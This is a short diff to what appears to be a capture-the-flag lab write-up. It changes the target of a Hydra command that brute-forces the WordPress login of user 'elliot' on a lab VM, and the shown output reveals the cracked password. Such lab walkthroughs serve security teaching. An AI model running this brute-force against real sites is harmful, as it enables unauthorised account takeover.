@@ -97,7 +97,7 @@ After a few minutes, we get:
 Now we know there is a WordPress user named **elliot**. Let’s try to bruteforce his password using the same technique and word list:
 
 ```text
-$ hydra -vV -l elliot -P wordslist.txt vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+$ hydra -vV -l elliot -P wordslist.txt 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
 [...]
 [80][http-post-form] host: 192.168.2.4 login: elliot password: ER28-0652
 1 of 1 target successfully completed, 1 valid password found
